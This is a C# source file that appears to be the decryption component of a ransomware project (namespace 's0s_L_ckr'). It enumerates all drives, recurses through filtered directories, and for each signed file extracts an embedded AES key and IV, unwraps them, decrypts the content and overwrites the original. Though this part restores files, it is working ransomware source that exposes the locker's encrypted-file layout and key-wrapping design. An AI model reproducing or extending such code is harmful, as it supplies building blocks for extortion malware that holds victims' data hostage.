using System;
using System.Diagnostics;
using System.IO;

namespace s0s_L_ckr
{
    //Decrypt All the Things 
    public sealed class DecStr
    {
        //Main Method for decryption of data
        public void DecrDis()
        {
#if DEBUG
            Trace.WriteLine("[+] Decrypt Disk");
#endif
            //Device Disk Enumeration
            DriveInfo[] driveInfos = DriveInfo.GetDrives();

            //Generate AES Engine
            CriptoKeyMgr.RotAesKey();
#if DEBUG
            Trace.WriteLine($"[+] {driveInfos} was enumerated");
#endif
            foreach (DriveInfo drive in driveInfos)
            {
                DecrDrv(drive);
            }
        }

        private void DecrDrv(DriveInfo drive)
        {
#if DEBUG
            Trace.WriteLine("");
            Trace.WriteLine($"[*] Decrypt Drive at {drive.Name}");
            Trace.Indent();
#endif
            //Drive State Check
            if (drive.IsReady)
            {
                DirectoryInfo[] directories = drive.RootDirectory.GetDirectories();
                foreach (DirectoryInfo directory in directories)
                    DecrDir(directory);
            }
            else
            {
#if DEBUG
                Trace.WriteLine("[+]Drive is not ready");
#endif
            }

#if DEBUG
            Trace.Unindent();
#endif
        }

        private void DecrDir(DirectoryInfo directoryInfo)
        {
#if DEBUG
            Trace.WriteLine($"\n [*] DecryptDirectory at {directoryInfo.Name}");
#endif
            //Check Dir Filter
            if (!Comn.DireInFil(directoryInfo.FullName))
            {
#if DEBUG
                Trace.Indent();
                Trace.WriteLine("[+] Directory not within filter");
                Trace.Unindent();
#endif
                return;
            }

            //Recursiveve Drives>Directories>Files

            try
            {
                DirectoryInfo[] subDrv = directoryInfo.GetDirectories();

                if (subDrv != null)
                {
                    foreach (DirectoryInfo subDir in subDrv)
                        DecrDir(subDir);
                }

                //Decrypt Drives
                FileInfo[] files = directoryInfo.GetFiles();
                foreach (FileInfo file in files)
                    DecrFil(file);
            }
            catch (Exception e)
            {
#if DEBUG
                Trace.Write("\n [!] Error While Read Directory");
                Trace.WriteLine(e.ToString());
#endif
            }
        }

        //Decrypt file
        private void DecrFil(FileInfo file)
        {
#if DEBUG
            Trace.WriteLine($"\n [*] DecrFil at {file.Name}");
#endif
            if (Comn.CheckSig(file))
            {
#if DEBUG
                Trace.WriteLine("[+] File to Decrypt");
#endif
                //File Struc
                byte[] encrFilKey;
                byte[] encFilIv;
                byte[] fileKey = null;
                byte[] fileIv = null;
                byte[] fileRawDat = null;
                int keyStrtIndex;
                int ivStrtIndex;
                string tempFilNam = file.FullName + ".wrk";

                //Read file struc that was built
                FileMgr.ReadFil(file, ref fileRawDat);

                // Compute Key Start Index
                keyStrtIndex = ConfigMgr.FILE_SIGN_SIZE;

                encrFilKey = new byte[CriptoKeyMgr.CURR_FIL_ENC_KEY.Length];
                Array.Copy(fileRawDat, keyStrtIndex, encrFilKey, 0, CriptoKeyMgr.CURR_FIL_ENC_KEY.Length);

                //Compute Iv Start Index
                ivStrtIndex = keyStrtIndex + encrFilKey.Length;

                encFilIv = new byte[CriptoKeyMgr.CURR_FIL_ENC_IV.Length];
                Array.Copy(fileRawDat, ivStrtIndex, encFilIv, 0, CriptoKeyMgr.CURR_FIL_ENC_IV.Length);

                //Decrypt Key and IV
                CriptoKeyMgr.UnprotectAesKey(ref encrFilKey, ref fileKey, ref encFilIv, ref fileIv);

                //Decrypt Files

                using (FileStream fileStream = File.Create(tempFilNam))
                {
                    fileStream.Position = 0;

                    //Write Data
                    CriptoFilMgr.Decrypt(fileStream, ref fileRawDat, ConfigMgr.FILE_SIGN_SIZE + encrFilKey.Length + encFilIv.Length, fileKey, fileIv);
                }

                // Clean Up
                file.Delete();

                //Copy Temp -> Old File
                File.Copy(tempFilNam, file.FullName);
                File.Delete(tempFilNam);
            }
            else
            {
#if DEBUG
                Trace.WriteLine("[+] File isn't encrypted");
#endif
                Console.WriteLine("Files not encrypted");
            }

#if DEBUG
            Trace.Unindent();
#endif
        }
    }
}
